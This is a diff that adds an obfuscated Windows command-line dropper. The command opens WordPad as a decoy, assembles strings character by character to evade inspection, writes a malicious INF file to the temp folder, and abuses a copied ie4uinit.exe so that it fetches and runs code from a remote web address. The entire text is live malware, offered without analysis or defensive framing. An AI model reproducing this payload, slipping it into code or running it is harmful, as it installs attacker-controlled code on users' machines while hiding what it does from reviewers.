@@ -1,0 +1,19 @@
+/v /c start "" "%ProgramFiles%\Windows NT\Accessories\wordpad.exe" & (for %g in ("monocha=se" "nellaxi=al" "itinerarye=e" "dishwi=et" ) do @set %~g) &&
+  callcall(for %g in ("n") do @set "bomb=%~g") &&
+  (for %m in ("t") do @set "aghanee=%~m") &&
+  callcall(for %g in ("n") do @set "bomb=%~g") &&
+  callcallcall(for %j in ("d") do @set "coales=%~j") &&
+  (for %s in (" ") do @set "josephine=%~s") &&
+  callcall(for %j in ("c") do @set "exrxc=%~j") &&
+  (for %c in ("i") do @set "actini=%~c") &&
+  call(for %r in ("e") do @set "quirkishe=%~r") &&
+  call(for %h in ("U") do @set "andes=%~h") &&
+  callcall(for %q in ("s") do @set "uroede=%~q") &&
+  (for %p in ("t") do @set "aghanee=%~p") &&
+  (for %i in ("7") do @set "echina=%~i") &&
+  (for %n in ("R") do @set "jar=%~n") &&
+  call(for %k in ("i") do @set "actini=%~k") &&
+  callcallcallcallcall(for %u in ("u") do @set "misdiv=%~u") &&
+  (for %y in ("[fyc_A6788E]" "%guardia%c%dextrorotat%o%glo%\" "%transit%.%incorp%l%inhum%,N%casementedn%,h%steamf%t%dainti%:%buttressl%/%steamf%s%fadea%s%guardia%g%tam%d%heir%s%aconi%p%antichlori%i%tam%-%dainti%a%guardia%c%tam%l%heir%c%aconi%m%buttressl%r%aconi%c%triactin%a%rachiti%d%dextrorotat%o%inhum%l" "[version]" "signature=$windows nt$" "[defaultinstall.windows7]" "delfiles=C03" "Un\" "Register\" "OCXs=fyc_A6788E" "[strings]" "servicename= 'poliadverr'" "shortsvcname= 'poliadverr'" "heir=." "buttressl=/" "casementedn=I" "tam=a" "glo=b" "incorp=d" "fadea=f" "antichlori=h" "amollishd=i" "transit=j" "triactin=k" "inhum=l" "rachiti=n" "aconi=o" "dainti=p" "dextrorotat=r" "guardia=s" "steamf=t" "vangue=u" "[C03]" "%amollishd%e%vangue%i%rachiti%i%steamf%.%amollishd%n%fadea%" "[destinationdirs]" "defaultdestdir=11" "C03=01" ) do @echo %~y) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
